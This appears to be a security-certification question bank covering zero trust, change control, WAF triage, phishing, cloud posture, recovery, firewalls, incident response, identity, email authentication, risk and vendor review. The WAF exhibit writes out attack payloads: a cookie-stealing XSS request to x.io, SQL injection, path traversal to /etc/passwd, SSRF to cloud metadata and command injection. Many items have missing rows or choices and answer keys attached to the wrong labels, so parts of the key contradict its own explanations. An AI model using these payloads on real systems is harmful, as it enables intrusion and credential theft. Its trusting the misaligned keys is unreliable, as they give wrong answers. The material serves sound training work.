title: Zero trust access decisions
prompt: A hospital rolled out zero trust access to its EHR. Using the policy and log in the exhibit, identify the component behind each log line, then choose the outcome for each access request.
exhibit:
POLICY  ehr-clinical
  allow if  group=Clinicians AND device.managed AND device.compliant
  step-up   if  location.new_country OR risk>=60   -> require FIDO2
  read-only if  device.managed=false               -> view only, no export
  deny      otherwise

LOG
10:02  [A] evaluated request user=dr.lin device=MBP-221 risk=12  -> allow
10:02  [B] created session token for dr.lin -> EHR, scope=clinical
10:02  [C] gateway admitted TLS session 10.4.1.7 -> ehr.internal:443
10:15  [A] evaluated request user=n.ortiz device=personal-iPad risk=20 -> read-only

rows.label: [A] evaluated the request against the policy
[C] admitted the TLS session in the traffic path
Request: Clinician, managed and compliant laptop, usual city, risk 25
Request: Clinician, managed and compliant laptop, first login from a new country
Request: Clinician on a personal tablet, usual city, risk 20
Request: Billing clerk (not in Clinicians) on a managed, compliant laptop

why: The policy engine makes the decision, the policy administrator turns it into a session or token, and the enforcement point in the traffic path admits or blocks the connection. The requester is the subject. Policy order matters: a managed, compliant clinician is allowed, a new country triggers step-up even on a good device, an unmanaged device gets read-only, and anyone outside the Clinicians group falls to deny.

title: Review a change request
prompt: You sit on the change advisory board. Review the change request in the exhibit. For each finding, choose the change management element it affects, then decide the request's outcome.
exhibit:
CHG-4471  Upgrade OpenSSL on payment gateway PG-01 and PG-02
Requested by: R. Shah     Risk: Medium     Window: Sat 01:00-03:00
Impact analysis: 'Low impact, library update only.'
Test results:    (blank)
Backout plan:    'Restore from backup if needed.'
Dependencies:    (blank)  -- note: POS terminals pin TLS 1.2 ciphers removed in this OpenSSL build
Approvals:       Network lead (yes), Application owner (not requested)
Restart needed:  Yes, gateway services (about 4 min each)
Docs to update:  (blank)

rows.label: 'Low impact' ignores that POS terminals rely on the removed ciphers
No evidence the build was tried in staging with POS traffic
'Restore from backup if needed' has no steps, owner, or time estimate
POS terminals' cipher pinning isn't listed
The payment application's owner never signed off
Both gateways restart; payments pause unless the restarts are staggered
Best CAB decision
rows.a: Return for rework: add testing, dependency, and owner sign-off
choices: Approve but skip the backout plan
Return for rework: add testing, dependency, and owner sign-off

why: The request understates impact because of an unlisted dependency, has no test evidence, gives a vague backout, lacks the application owner's approval, and doesn't plan for the restart. The window is fine, and documentation updates follow implementation, so they aren't the blockers here. The right outcome is to send it back for rework, not approve it or kill a needed security update.

title: Triage the WAF log
prompt: A WAF in monitor mode logged the requests in the exhibit against a retailer's web app. Classify each request (not every category is used), then choose the root-cause fix for the two that were confirmed exploitable.
exhibit:
#1  GET  /search?q=%3Cimg%20src%3Dx%20onerror%3Dfetch('//x.io/'%2Bdocument.cookie)%3E
#2  GET  /orders?id=8812%20AND%20SLEEP(7)--          (response 7,140 ms)
#3  GET  /static/..%252f..%252f..%252fetc%252fpasswd
#4  POST /api/preview   url=http://169.254.169.254/latest/meta-data/
#5  POST /tools/dns     host=example.com%3Bid
#6  GET  /products?page=3&sort=price
#7  PATCH /api/me       {"name":"Ana","isAdmin":true}

rows.label: Fix for #2 (confirmed)
choices: Switch the WAF to blocking only

rows.label: Fix for #4 (confirmed)
rows.a: Allow-list destinations and block internal ranges
choices: Allow-list destinations and block internal ranges
Encode the url parameter in responses

why: #1 is an encoded img/onerror payload stealing cookies (XSS). #2's 7-second delay proves time-based SQL injection. #3 double-encodes ../ to reach /etc/passwd (traversal). #4 makes the server fetch the cloud metadata address (SSRF). #5's %3B is ';' chaining a shell command (command injection). #6 is normal paging. #7 sets a privileged field the server should never accept (mass assignment). CSRF and replay don't appear. Root fixes: parameterized queries for SQLi and destination allow-listing for SSRF; a WAF is a compensating layer, not the fix.

title: Classify the reported events
prompt: The security team at a credit union received the reports in the exhibit this week. Identify the MOST specific technique for each report (not every option is used), then choose the best response for the two highlighted reports.
exhibit:
R1  Text: 'Your debit card is frozen. Verify at example-cu-secure.com' (real site: example-cu.org)
R2  Caller claims to be from the core banking vendor, cites last night's real outage ticket, asks a teller for her MFA code
R3  Email to the CFO only, referencing the board meeting date, linking to a fake board portal
R4  A man in a courier vest follows staff through the badge door carrying boxes
R5  The vendor's real mailbox replies in an existing thread asking to change remittance details
R6  A social account using the credit union's logo answers members' complaints and links to a login page
R7  QR code on a flyer in the branch lobby offering a 'member rewards' signup

rows.label: Best response to R5
rows.a: Call the vendor at the number on file before changing anything
choices: Call the vendor at the number on file before changing anything
Reply in the thread asking the vendor to confirm
Make the change, because SPF and DKIM passed
Block the vendor's domain at the email gateway

rows.label: Best response to R2
rows.a: Refuse, then verify through the vendor's known support line
choices: Refuse, then verify through the vendor's known support line
Give the code, since the ticket number was correct
Ask the caller for their employee ID and continue
Transfer the caller to a manager to approve

why: R1 is phishing by SMS that uses a lookalike domain; the MOST specific technique for the message is smishing. R2's believable story built on a real event is pretexting. R3 targets an executive (whaling). R4 is tailgating. R5 comes from the vendor's real, compromised mailbox (BEC), so authentication passing proves nothing; verify by calling a number you already have. R6 poses as the brand's support. R7 hides the link in a QR image. For R2, never share MFA codes and verify through a channel you choose.

title: Fix the cloud posture findings
prompt: A cloud security posture tool produced the findings in the exhibit for a retailer's production account. Choose the BEST remediation for each finding (not every option is used), then answer the two follow-up questions.
exhibit:
F1  Bucket 'cust-exports' policy: Principal '*' allows s3:GetObject
F2  Security group sg-db allows tcp/3306 from 0.0.0.0/0
F3  IAM user 'ci-deploy' has a static access key created 412 days ago, used from a laptop
F4  CloudTrail logging disabled in two regions
F5  Role 'img-resizer' policy: Action s3:*, Resource *
F6  Root account has no MFA
F7  EBS volumes for 'payroll-db' unencrypted
choices: Remove public principal access and enable block-public-access
Restrict the rule to the app tier's security group
Replace the key with a short-lived role for the pipeline
Enable logging in all regions to a protected central bucket
Scope the policy to the needed actions and buckets
Enable MFA on the root account and lock its credentials away
Encrypt the volumes with a managed KMS key
Delete the bucket and recreate it in another region
Open a ticket with the provider to fix it for you

rows.label: F1
rows.a: Remove public principal access and enable block-public-access

rows.label: F2
rows.a: Restrict the rule to the app tier's security group

rows.label: F3
rows.a: Replace the key with a short-lived role for the pipeline

rows.label: F4
rows.a: Enable logging in all regions to a protected central bucket

rows.label: F5
rows.a: Scope the policy to the needed actions and buckets

rows.label: F6
rows.a: Enable MFA on the root account and lock its credentials away

rows.label: F7
rows.a: Encrypt the volumes with a managed KMS key

rows.label: Which finding should be fixed FIRST?
rows.a: F1, because customer data is publicly readable now
choices: F1, because customer data is publicly readable now
F4, because logging gaps hide everything else
F7, because unencrypted volumes are the most common breach cause
F3, because the key is over a year old

rows.label: Under the shared responsibility model, who owns these fixes?

why: Each fix targets the specific misconfiguration: remove public access, scope network rules to the tier that needs them, swap long-lived keys for short-lived roles, log every region centrally, apply least privilege, protect root with MFA, and encrypt at rest. Customer data that is publicly readable right now is the most urgent exposure. Configuration of identities, network rules, logging, and data is always the customer's responsibility. Deleting buckets or asking the provider fixes nothing.

title: Design the recovery strategy
prompt: Using the business impact analysis in the exhibit, choose the recovery site and the data protection method for each system, then answer the final two questions. Choose the LEAST costly option that still meets each objective.
exhibit:
System           RTO        RPO          Notes
Card processing  15 min     0 (no loss)   Primary and DR sites 40 km apart
Email            8 hours    1 hour        SaaS available as an option
HR records       5 days     24 hours      Low change rate
Marketing site   2 weeks    1 week        Static content, rebuilt from a repository

rows.label: Why is synchronous replication workable for card processing here?
rows.a: The sites are only 40 km apart, so the added latency is small
choices: The sites are only 40 km apart, so the added latency is small
It costs less than asynchronous replication
It removes the need for any backups

rows.label: Which test proves the card processing RTO without disrupting customers?
rows.a: A scheduled failover test in a maintenance window
choices: A scheduled failover test in a maintenance window
Checking that backup jobs report success

why: A 15-minute RTO with zero data loss needs a hot site and synchronous replication, which is practical over 40 km because latency grows with distance. A 1-hour RPO for email calls for hourly snapshots or log shipping. HR's 5-day RTO and 24-hour RPO fit a cold site and nightly backups. Marketing's one-week RPO fits weekly backups. Only an actual failover test proves an RTO, and replication still needs backups behind it because it copies corruption and ransomware.

title: Trace and fix the egress policy
prompt: An outbound firewall policy is in the exhibit. Rules are processed top-down and stop at the first match, and there is no rule after rule 6. Part 1: decide what happens to each flow. Part 2: choose the fix for each requirement.
exhibit:
#  Action  Proto  Source            Destination        Port
1  PERMIT  TCP    10.20.0.0/16      10.0.0.5 (proxy)   8080
2  PERMIT  UDP    10.20.0.0/16      10.0.0.53          53
3  PERMIT  TCP    10.0.0.5          any                80,443
4  PERMIT  TCP    10.20.0.0/16      any                443
5  DENY    TCP    10.20.9.0/24      any                any (log)
6  PERMIT  UDP    10.0.0.53         any                53

rows.label: Requirement: kiosks (10.20.9.0/24) must not reach the internet at all
choices: Add a second copy of rule 5 at the end

rows.label: Requirement: users must browse ONLY through the proxy
Why add an explicit logged deny-all at the end?
rows.a: To log denied traffic; the implicit deny usually doesn't
choices: To log denied traffic; the implicit deny usually doesn't
Without it, unmatched traffic would be allowed
Firewalls require an even number of rules

why: Rule 1 allows browsers to reach the proxy. The kiosk's direct HTTPS matches the broad rule 4 before reaching its deny at rule 5, so the deny is shadowed and must move above rule 4. TCP 8443 and direct public DNS match nothing and fall to the implicit deny. The internal resolver may forward DNS through rule 6. Rule 4 lets every client bypass the proxy on 443, so deleting it forces browsing through the proxy, which still has its own rule 3. An explicit deny-all exists mainly to log what gets dropped.

title: Run the mailbox compromise response
prompt: A finance employee's mailbox was compromised and used for invoice fraud. Using the timeline in the exhibit, identify the incident response phase of each activity, then choose the best action for each decision point.
exhibit:
Mon 09:10  User reports a vendor asking why payment went to a new bank account
Mon 09:40  Analyst finds a hidden inbox rule forwarding 'invoice' emails to a free webmail address
Mon 09:55  Sign-in logs show the user's session token reused from another country since Friday
Mon 10:05  Team revokes sessions, resets the password, removes the rule
Mon 13:00  OAuth app 'Mail Sync Pro' with Mail.Read found and removed; tenant searched for the same app
Tue 08:00  Mailbox returned to the user with conditional access requiring a compliant device
Fri 15:00  Review leads to a new payment-change callback procedure

rows.label: Mon 10:05 sessions revoked, password reset, rule removed
Mon 13:00 malicious OAuth app removed and hunted tenant-wide
Tue 08:00 mailbox returned with conditional access
Why revoke sessions instead of only resetting the password?
rows.a: Stolen session tokens stay valid after a password reset
choices: Stolen session tokens stay valid after a password reset
Password resets take 24 hours to apply
Revoking sessions also removes inbox rules
Session revocation notifies the vendor automatically

rows.label: Which data source best shows what the attacker read?
rows.a: Mailbox audit logs of item access
choices: Mailbox audit logs of item access
DNS query logs from the resolver

why: The report is detection, digging into rules and sign-ins is analysis, and revoking sessions and removing the rule contains the attacker. Removing the malicious OAuth app, the persistence that survived the password reset, and hunting for it elsewhere is eradication. Returning the mailbox under stronger controls is recovery, and the new callback procedure is lessons learned. Token theft bypasses passwords, so sessions must be revoked, and mailbox audit logs record which items were accessed.

title: Design the identity controls
prompt: A mid-sized company is fixing identity problems found in an audit. Choose the BEST control for each finding (not every option is used).
exhibit:
A1  Former employees keep accounts in 40 SaaS apps for weeks after leaving
A2  Admins hold Domain Admin rights permanently, 24/7
A3  Users approve rogue OAuth apps that request mailbox access
A4  Phishing kits relay MFA codes in real time to the real login page
A5  Help desk resets passwords for anyone who knows an employee's birthday
A6  A shared 'svc_report' password is in a script on a file share
A7  Payroll admins can both add employees and approve pay runs
choices: SCIM provisioning from the identity provider
Admin consent workflow for third-party apps

rows.label: A1
rows.a: SCIM provisioning from the identity provider

rows.label: A3
rows.a: Admin consent workflow for third-party apps

why: SCIM ties app accounts to the identity provider's lifecycle, and JIT access removes standing admin rights. Admin consent stops users from granting rogue apps access, and FIDO2 is the phishing-resistant answer to relayed codes. Help desk resets need verification an attacker can't look up. Secrets in scripts belong in a vault with rotation, and adding employees and approving pay must be split between people. Longer expiration and security questions don't fix any of these.

title: Repair the email authentication records
prompt: A company's email authentication is failing. Review the DNS records and receiver results in the exhibit, identify each problem, then choose the correct fix.
exhibit:
company.com.            TXT  "v=spf1 include:_spf.google.com include:sendgrid.net include:mailgun.org include:spf.protection.outlook.com include:servers.mcsv.net include:mktomail.com mx a ?all"
_dmarc.company.com.     TXT  "v=DMARC1; p=none; rua=mailto:dmarc@company.com"
s1._domainkey.company.com  (no record)
parked-company.net      (no SPF, no DMARC)

Receiver results:
  newsletters via SendGrid: spf=permerror  dkim=pass header.d=sendgrid.net  dmarc=fail
  spoofed mail claiming company.com: delivered to inboxes
  invoices spoofed from parked-company.net: delivered
choices: Too many DNS lookups in SPF
SPF qualifier ?all is neutral, so failures are ignored
Parked domain has no sending policy
MX record points to the wrong server
DNSSEC not enabled on the zone

rows.label: Newsletters get spf=permerror
rows.a: Too many DNS lookups in SPF

rows.label: SPF failures would not cause rejection even if fixed
rows.a: SPF qualifier ?all is neutral, so failures are ignored

rows.label: Spoofed company.com mail still reaches inboxes
Newsletters fail DMARC even though DKIM passes
Invoices spoofed from parked-company.net are delivered
rows.a: Parked domain has no sending policy

rows.label: Correct record for parked-company.net
rows.a: v=spf1 -all plus a DMARC p=reject record
choices: v=spf1 -all plus a DMARC p=reject record
An MX record pointing to the main mail server
A DNSSEC DS record at the registrar

rows.label: Correct next step for DMARC once alignment is fixed
rows.a: Move from p=none to p=quarantine, then p=reject
choices: Move from p=none to p=quarantine, then p=reject
Keep p=none permanently to avoid issues
Add a second DMARC record with p=reject

why: Seven includes plus mx and a push SPF past 10 lookups (permerror), and ?all is neutral, so even a fixed SPF wouldn't fail spoofed mail. DMARC at p=none only reports. SendGrid signs with its own domain, so DKIM passes but isn't aligned; it needs a company.com DKIM key (the missing s1 selector). Parked domains should publish -all and DMARC reject. Tighten DMARC in stages once legitimate mail aligns. A domain can have only one DMARC record, and MX and DNSSEC don't solve these problems.

title: Complete the risk register
prompt: The board's appetite statement: 'Treat any risk whose ALE exceeds $50,000; transfer or mitigate when the treatment costs less than the ALE it removes; never accept a risk that could halt patient care.' Calculate the missing values, then choose the BEST response for each risk (not every option is used).
exhibit:
Risk  Description                              AV           EF     ARO    Option and annual cost
A     Ransomware on clinical systems          $3,000,000   40%    0.25   EDR + immutable backups: $90,000, cuts ARO to 0.05
B     Theft of encrypted laptops              $2,500       100%   12     (no treatment proposed)
C     Legacy fax server used by one clinic    -            -      -      Retire it; clinic switches to secure e-fax
D     Third-party billing outage              $400,000     50%    0.5    Business interruption insurance: $30,000
E     Website defacement                      $20,000      50%    1      WAF service: $45,000

rows.label: Risk A: annual value of the treatment

why: A: SLE = $3,000,000 × 0.40 = $1,200,000, ALE = × 0.25 = $300,000; after treatment ALE = $60,000, so the treatment removes $240,000 for $90,000, a $150,000 net value: mitigate. B: $2,500 × 12 = $30,000, below the $50,000 treatment threshold and already encrypted: accept. C: retiring the legacy system removes the risk entirely: avoid. D: ALE = $200,000 × 0.5 = $100,000, and $30,000 of insurance covers it cheaply: transfer. E: ALE is $10,000 and the fix costs $45,000: accept.

title: Assess a new vendor
prompt: A hospital is onboarding a cloud transcription vendor. Review the evidence in the exhibit. For each item, choose what it is or what it shows (not every option is used), then make the two decisions.
exhibit:
E1  SOC 2 Type II report, period Jan 1 - Jun 30; today is Nov 18
E2  Letter from vendor: 'no material control changes since June 30'
E3  Vendor questionnaire: 'All admin access requires MFA'
E4  Independent pen test summary (Aug): 'Admin portal accepts password only'
E5  Vendor stores audio backups with 'StorCo', a provider the hospital hasn't reviewed
E6  Draft contract: breach notice 'within a reasonable time'; no audit rights

rows.label: Best contract fix for E6
rows.a: 72-hour breach notification and a right-to-audit clause
choices: 72-hour breach notification and a right-to-audit clause
A longer contract term with a price discount
An NDA covering the hospital's own policies
A clause letting the vendor list the hospital as a client

rows.label: Best onboarding decision
rows.a: Proceed only after the MFA gap is fixed and StorCo is reviewed
choices: Proceed only after the MFA gap is fixed and StorCo is reviewed
Sign now, because the SOC 2 report is clean
Reject permanently because of one pen test finding
Sign now and review the vendor next year

why: E1 is independent evidence, and E2 bridges the gap since the report period ended. E3 is the vendor's own claim, and E4, independent evidence, contradicts it. E5 is a fourth party holding the hospital's data, and E6's vague notice and lack of audit rights are weak terms; fix them with a defined notification window and a right to audit. The sound decision is conditional approval: resolve the contradiction and review the fourth party, rather than signing blindly or rejecting a fixable vendor.
